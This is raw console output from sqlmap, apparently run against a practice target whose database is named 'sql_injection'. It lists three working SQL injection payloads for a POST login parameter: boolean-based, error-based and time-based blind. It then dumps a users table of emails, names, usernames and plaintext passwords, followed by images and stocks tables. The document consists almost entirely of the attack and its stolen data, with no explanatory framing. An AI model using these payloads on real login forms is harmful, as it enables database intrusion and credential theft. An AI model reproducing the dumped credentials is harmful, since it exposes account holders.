

---


# Output
---

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:33:02 /2025-07-04/

[17:33:02] [INFO] parsing HTTP request from 'burp'
[17:33:02] [INFO] resuming back-end DBMS 'mysql' 
[17:33:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=-3456' OR 6429=6429#&password=1

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=1' AND (SELECT 5745 FROM(SELECT COUNT(*),CONCAT(0x71787a7671,(SELECT (ELT(5745=5745,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nnKo&password=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 1547 FROM (SELECT(SLEEP(5)))Dzip)-- HCce&password=1
---
[17:33:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:33:02] [INFO] fetching database names
[17:33:02] [INFO] resumed: 'information_schema'
[17:33:02] [INFO] resumed: 'mysql'
[17:33:02] [INFO] resumed: 'performance_schema'
[17:33:02] [INFO] resumed: 'sql_injection'
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sql_injection

[17:33:02] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:33:02] [INFO] fetching current database
[17:33:02] [INFO] resumed: 'sql_injection'
[17:33:02] [INFO] fetching tables for database: 'sql_injection'
[17:33:02] [INFO] resumed: 'images'
[17:33:02] [INFO] resumed: 'users'
[17:33:02] [INFO] resumed: 'stocks'
[17:33:02] [INFO] fetching columns for table 'users' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'id'
[17:33:02] [INFO] resumed: 'int(6)'
[17:33:02] [INFO] resumed: 'username'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] resumed: 'email'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] resumed: 'password'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] resumed: 'name'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] resumed: 'surname'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] fetching entries for table 'users' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'Angelo'
[17:33:02] [INFO] resumed: 'ephraim_frits@supermail.com'
[17:33:02] [INFO] resumed: '1'
[17:33:02] [INFO] resumed: 'ii7phaufuGah'
[17:33:02] [INFO] resumed: 'Williams'
[17:33:02] [INFO] resumed: 'angelo12'
[17:33:02] [INFO] resumed: 'John'
[17:33:02] [INFO] resumed: 'JohnDMoore@dayrep.com'
[17:33:02] [INFO] resumed: '2'
[17:33:02] [INFO] resumed: 'Oir6ot6Aet4'
[17:33:02] [INFO] resumed: 'Moore'
[17:33:02] [INFO] resumed: 'moore'
[17:33:02] [INFO] resumed: 'Nichole'
[17:33:02] [INFO] resumed: 'NicholeWWannamaker@teleworm.us'
[17:33:02] [INFO] resumed: '3'
[17:33:02] [INFO] resumed: 'Baevaed0jah'
[17:33:02] [INFO] resumed: 'Wannamaker'
[17:33:02] [INFO] resumed: 'nicool'
[17:33:02] [INFO] resumed: 'Lewis'
[17:33:02] [INFO] resumed: 'LewisLSing@teleworm.us'
[17:33:02] [INFO] resumed: '4'
[17:33:02] [INFO] resumed: 'aeShek9d'
[17:33:02] [INFO] resumed: 'Sing'
[17:33:02] [INFO] resumed: 'singlewis'
[17:33:02] [INFO] resumed: 'Rebecca'
[17:33:02] [INFO] resumed: 'RebeccaJRussell@rhyta.com'
[17:33:02] [INFO] resumed: '5'
[17:33:02] [INFO] resumed: 'uQuah5athah'
[17:33:02] [INFO] resumed: 'Russell'
[17:33:02] [INFO] resumed: 'russrebecca'
[17:33:02] [INFO] resumed: 'Arthur'
[17:33:02] [INFO] resumed: 'ArthurHNadeau@dayrep.com'
[17:33:02] [INFO] resumed: '6'
[17:33:02] [INFO] resumed: 'to4ixia7C'
[17:33:02] [INFO] resumed: 'Nadeau'
[17:33:02] [INFO] resumed: 'arthurnad'
[17:33:02] [INFO] resumed: 'teadorate'
[17:33:02] [INFO] resumed: 'temojev119@drlatvia.com'
[17:33:02] [INFO] resumed: '7'
[17:33:02] [INFO] resumed: 'temojev119'
[17:33:02] [INFO] resumed: 'macheal'
[17:33:02] [INFO] resumed: 'teador'
[17:33:02] [INFO] resumed: 'Mary'
[17:33:02] [INFO] resumed: 'MaryGChatterton@rhyta.com'
[17:33:02] [INFO] resumed: '8'
[17:33:02] [INFO] resumed: 'Iequahx4'
[17:33:02] [INFO] resumed: 'G.Chatterton'
[17:33:02] [INFO] resumed: 'Thiped'
[17:33:02] [INFO] resumed: 'Carrie'
[17:33:02] [INFO] resumed: 'CarrieDYoung@rhyta.com'
[17:33:02] [INFO] resumed: '9'
[17:33:02] [INFO] resumed: 'kei7Ru4aay'
[17:33:02] [INFO] resumed: 'Young'
[17:33:02] [INFO] resumed: 'Duccoldany'
[17:33:02] [INFO] resumed: 'Karen'
[17:33:02] [INFO] resumed: 'KarenRVelez@rhyta.com'
[17:33:02] [INFO] resumed: '10'
[17:33:02] [INFO] resumed: 'aiPh1aht'
[17:33:02] [INFO] resumed: 'Velez'
[17:33:02] [INFO] resumed: 'Basure'
[17:33:02] [INFO] resumed: 'Virginia'
[17:33:02] [INFO] resumed: 'VirginiaJBryson@jourrapide.com'
[17:33:02] [INFO] resumed: '11'
[17:33:02] [INFO] resumed: 'Oom1dai2Ae'
[17:33:02] [INFO] resumed: 'Bryson'
[17:33:02] [INFO] resumed: 'Lonce1992'
[17:33:02] [INFO] resumed: 'Tiffany'
[17:33:02] [INFO] resumed: 'TiffanyRGriffith@dayrep.com'
[17:33:02] [INFO] resumed: '12'
[17:33:02] [INFO] resumed: 'ieSh6aim'
[17:33:02] [INFO] resumed: 'Griffith'
[17:33:02] [INFO] resumed: 'Lawas1965'
[17:33:02] [INFO] resumed: 'Heather'
[17:33:02] [INFO] resumed: 'HeatherLJohnson@armyspy.com'
[17:33:02] [INFO] resumed: '13'
[17:33:02] [INFO] resumed: 'Fah6einai7s'
[17:33:02] [INFO] resumed: 'Johnson'
[17:33:02] [INFO] resumed: 'Rompubse'
[17:33:02] [INFO] resumed: 'Ramona'
[17:33:02] [INFO] resumed: 'RamonaKWebster@dayrep.com'
[17:33:02] [INFO] resumed: '14'
[17:33:02] [INFO] resumed: 'aeYahm6zee0'
[17:33:02] [INFO] resumed: 'Webster'
[17:33:02] [INFO] resumed: 'Sequand'
[17:33:02] [INFO] resumed: 'Sandra'
[17:33:02] [INFO] resumed: 'andraJFraser@teleworm.us'
[17:33:02] [INFO] resumed: '15'
[17:33:02] [INFO] resumed: 'Oemeey3uji'
[17:33:02] [INFO] resumed: 'Fraser'
[17:33:02] [INFO] resumed: 'Moret1948'
Database: sql_injection
Table: users
[15 entries]
+----+--------------------------------+-----------+--------------+--------------+-------------+
| id | email                          | name      | surname      | password     | username    |
+----+--------------------------------+-----------+--------------+--------------+-------------+
| 1  | ephraim_frits@supermail.com    | Angelo    | Williams     | ii7phaufuGah | angelo12    |
| 2  | JohnDMoore@dayrep.com          | John      | Moore        | Oir6ot6Aet4  | moore       |
| 3  | NicholeWWannamaker@teleworm.us | Nichole   | Wannamaker   | Baevaed0jah  | nicool      |
| 4  | LewisLSing@teleworm.us         | Lewis     | Sing         | aeShek9d     | singlewis   |
| 5  | RebeccaJRussell@rhyta.com      | Rebecca   | Russell      | uQuah5athah  | russrebecca |
| 6  | ArthurHNadeau@dayrep.com       | Arthur    | Nadeau       | to4ixia7C    | arthurnad   |
| 7  | temojev119@drlatvia.com        | teadorate | macheal      | temojev119   | teador      |
| 8  | MaryGChatterton@rhyta.com      | Mary      | G.Chatterton | Iequahx4     | Thiped      |
| 9  | CarrieDYoung@rhyta.com         | Carrie    | Young        | kei7Ru4aay   | Duccoldany  |
| 10 | KarenRVelez@rhyta.com          | Karen     | Velez        | aiPh1aht     | Basure      |
| 11 | VirginiaJBryson@jourrapide.com | Virginia  | Bryson       | Oom1dai2Ae   | Lonce1992   |
| 12 | TiffanyRGriffith@dayrep.com    | Tiffany   | Griffith     | ieSh6aim     | Lawas1965   |
| 13 | HeatherLJohnson@armyspy.com    | Heather   | Johnson      | Fah6einai7s  | Rompubse    |
| 14 | RamonaKWebster@dayrep.com      | Ramona    | Webster      | aeYahm6zee0  | Sequand     |
| 15 | andraJFraser@teleworm.us       | Sandra    | Fraser       | Oemeey3uji   | Moret1948   |
+----+--------------------------------+-----------+--------------+--------------+-------------+

[17:33:02] [INFO] table 'sql_injection.users' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/users.csv'
[17:33:02] [INFO] fetching columns for table 'images' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'id'
[17:33:02] [INFO] resumed: 'int(11)'
[17:33:02] [INFO] resumed: 'path'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] fetching entries for table 'images' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'images/1.png'
[17:33:02] [INFO] resumed: '1'
[17:33:02] [INFO] resumed: 'images/2.png'
[17:33:02] [INFO] resumed: '2'
[17:33:02] [INFO] resumed: 'images/3.png'
[17:33:02] [INFO] resumed: '3'
[17:33:02] [INFO] resumed: 'images/4.png'
[17:33:02] [INFO] resumed: '4'
[17:33:02] [INFO] resumed: 'images/5.png'
[17:33:02] [INFO] resumed: '5'
[17:33:02] [INFO] resumed: 'images/6.png'
[17:33:02] [INFO] resumed: '6'
[17:33:02] [INFO] resumed: 'images/7.png'
[17:33:02] [INFO] resumed: '7'
[17:33:02] [INFO] resumed: 'images/8.png'
[17:33:02] [INFO] resumed: '8'
[17:33:02] [INFO] resumed: 'images/9.png'
[17:33:02] [INFO] resumed: '9'
[17:33:02] [INFO] resumed: 'images/10.png'
[17:33:02] [INFO] resumed: '10'
Database: sql_injection
Table: images
[10 entries]
+----+---------------+
| id | path          |
+----+---------------+
| 1  | images/1.png  |
| 2  | images/2.png  |
| 3  | images/3.png  |
| 4  | images/4.png  |
| 5  | images/5.png  |
| 6  | images/6.png  |
| 7  | images/7.png  |
| 8  | images/8.png  |
| 9  | images/9.png  |
| 10 | images/10.png |
+----+---------------+

[17:33:02] [INFO] table 'sql_injection.images' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/images.csv'
[17:33:02] [INFO] fetching columns for table 'stocks' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'id'
[17:33:02] [INFO] resumed: 'int(11)'
[17:33:02] [INFO] resumed: 'name'
[17:33:02] [INFO] resumed: 'varchar(255)'
[17:33:02] [INFO] fetching entries for table 'stocks' in database 'sql_injection'
[17:33:02] [INFO] resumed: 'iphone11'
[17:33:02] [INFO] resumed: '1'
[17:33:02] [INFO] resumed: 'applewatch7'
[17:33:02] [INFO] resumed: '2'
[17:33:02] [INFO] resumed: 'iphone13'
[17:33:02] [INFO] resumed: '3'
[17:33:02] [INFO] resumed: 'iphonese'
[17:33:02] [INFO] resumed: '4'
[17:33:02] [INFO] resumed: 'apple20w'
[17:33:02] [INFO] resumed: '5'
Database: sql_injection
Table: stocks
[5 entries]
+----+-------------+
| id | name        |
+----+-------------+
| 1  | iphone11    |
| 2  | applewatch7 |
| 3  | iphone13    |
| 4  | iphonese    |
| 5  | apple20w    |
+----+-------------+

[17:33:02] [INFO] table 'sql_injection.stocks' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/stocks.csv'
[17:33:02] [INFO] fetched data logged to text files under '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz'

[*] ending @ 17:33:02 /2025-07-04/


